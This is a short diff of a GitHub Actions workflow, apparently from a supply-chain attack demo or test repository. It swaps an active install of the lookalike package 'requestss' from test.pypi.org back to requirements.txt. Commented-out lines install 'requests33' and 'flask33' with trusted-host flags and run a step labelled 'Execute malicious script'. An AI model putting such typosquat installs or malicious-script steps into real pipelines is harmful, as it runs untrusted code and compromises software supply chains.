@@ -27,10 +27,10 @@ jobs:
           python-version: "3.13"
 
       - name: Install dependencies
-       # run: pip install -r requirements.txt
+        run: pip install -r requirements.txt
        # run: pip install --no-deps --trusted-host pypi.org --trusted-host files.pythonhosted.org requests33==0.1.0
       # run: pip install --no-deps --trusted-host pypi.org --trusted-host files.pythonhosted.org flask33==0.1.0
-        run: pip install --no-deps -i https://test.pypi.org/simple/ requestss
+        # run: pip install --no-deps -i https://test.pypi.org/simple/ requestss
         
    #   - name: 😈 Execute malicious script
     #    run: bash run_malicious_scripts.sh
